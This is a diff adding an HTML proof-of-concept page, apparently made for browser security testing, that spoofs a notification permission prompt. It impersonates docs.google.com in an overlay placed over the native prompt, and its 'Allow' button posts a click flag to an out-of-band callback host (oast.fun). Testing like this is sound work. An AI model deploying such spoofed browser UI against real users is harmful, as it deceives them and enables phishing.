@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Permission Spoof Test</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: sans-serif;
+    }
+    .trigger {
+      margin: 100px auto;
+      display: block;
+      padding: 15px 25px;
+      font-size: 18px;
+    }
+    .overlay {
+      position: fixed;
+      top: 10px; /* tepat di bawah URL bar */
+      left: 10px;
+      background: #f9f9f9;
+      border: 1px solid #ccc;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      padding: 12px;
+      z-index: 9999;
+      font-size: 14px;
+      border-radius: 4px;
+      width: 260px;
+      display: none;
+    }
+    .overlay button {
+      background: #1a73e8;
+      border: none;
+      color: white;
+      padding: 5px 12px;
+      margin-left: 10px;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+<button class="trigger" onclick="spoofPrompt()">Enable Notifications</button>
+
+<div class="overlay" id="fakePrompt">
+  docs.google.com wants to<br>Show notifications
+  <button onclick="exfiltrate()">Allow</button>
+</div>
+
+<script>
+function spoofPrompt() {
+  // Trigger native prompt
+  Notification.requestPermission().then(() => {});
+  
+  // Show fake UI on top
+  setTimeout(() => {
+    document.getElementById("fakePrompt").style.display = "block";
+  }, 300);
+}
+
+function exfiltrate() {
+  fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ fake_click: true })
+  });
+  alert("You clicked a spoofed prompt.");
+}
+</script>
+
+</body>
+</html>
